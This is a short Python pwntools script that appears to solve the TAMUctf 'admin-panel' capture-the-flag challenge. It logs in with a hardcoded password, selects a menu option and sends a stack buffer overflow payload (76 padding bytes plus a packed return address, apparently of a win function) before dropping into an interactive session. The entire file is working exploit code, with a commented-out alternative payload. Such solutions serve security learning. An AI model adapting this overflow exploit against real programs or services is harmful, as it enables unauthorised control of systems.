from pwn import *

context.log_level = "debug"
EXE = ELF('./admin-panel')
context.binary = EXE
if args.REMOTE:
    io = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")
else:
    io = process()
io.recvline()
io.recvline()
io.sendline(b"admin")
io.recvline()
io.sendline(b"secretpass123")
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.sendline(b"2")
io.recvline()
io.sendline(b'A'*(64+4+8) + p32(int("1163",16)))
# p.sendline(b'A' * 16 + p32(exe.sym['win']))
# print(p.recvline())
# print(p.recvline())
io.interactive()
